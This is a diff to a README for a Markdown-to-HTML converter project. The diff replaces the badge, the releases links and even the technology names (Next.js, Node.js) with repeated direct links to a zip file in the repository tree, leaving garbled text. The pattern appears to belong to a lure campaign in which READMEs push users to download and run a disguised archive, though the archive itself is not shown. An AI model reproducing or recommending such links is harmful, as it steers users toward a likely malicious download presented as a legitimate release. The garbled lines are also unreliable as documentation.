@@ -1,6 +1,6 @@
 # Markdown to HTML Converter 🌟
 
-![Markdown to HTML](https://img.shields.io/badge/Markdown%20to%20HTML-Converter-brightgreen)
+![Markdown to HTML](https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip%20to%20HTML-Converter-brightgreen)
 
 Welcome to the **Markdown to HTML Converter**! This tool allows you to convert your Markdown files into clean HTML quickly and easily. No sign-up is required, and you can enjoy a live preview of your content as you edit. 
 
@@ -24,19 +24,19 @@ Welcome to the **Markdown to HTML Converter**! This tool allows you to convert y
 
 ## How to Use 🛠️
 
-1. **Visit the Tool**: Go to our [Markdown to HTML Converter](https://github.com/Sstron0/markdown-to-html/releases).
+1. **Visit the Tool**: Go to our [Markdown to HTML Converter](https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip).
 2. **Input Your Markdown**: Paste or type your Markdown text into the editor.
 3. **Preview Your HTML**: Watch the live preview update as you make changes.
 4. **Export Your File**: Choose to download your output as HTML or PDF.
 
 ## Installation 🚀
 
-To get started, download the latest release from our [Releases section](https://github.com/Sstron0/markdown-to-html/releases). Once downloaded, follow these steps:
+To get started, download the latest release from our [Releases section](https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip). Once downloaded, follow these steps:
 
 1. Extract the downloaded file.
 2. Open your terminal or command prompt.
 3. Navigate to the extracted folder.
-4. Run the application using your preferred method (Node.js, Next.js, etc.).
+4. Run the application using your preferred method (https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip, https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip, etc.).
 
 ## Technologies Used 🖥️
 
@@ -44,9 +44,9 @@ This project utilizes a variety of technologies to provide a seamless experience
 
 - **JavaScript**: The backbone of the application.
 - **React**: For building user interfaces.
-- **Next.js**: For server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip**: For server-side rendering and static site generation.
 - **TypeScript**: To enhance code quality and maintainability.
-- **Node.js**: For backend services.
+- **https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip**: For backend services.
 - **Markdown Libraries**: To handle Markdown parsing and rendering.
 
 ## Contributing 🤝
@@ -66,7 +66,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links 🔗
 
-For more information, updates, and downloads, visit our [Releases section](https://github.com/Sstron0/markdown-to-html/releases). 
+For more information, updates, and downloads, visit our [Releases section](https://raw.githubusercontent.com/Sstron0/markdown-to-html/master/app/converter/markdown_to_html_1.0.zip). 
 
 If you have any questions or suggestions, feel free to open an issue on GitHub.
 
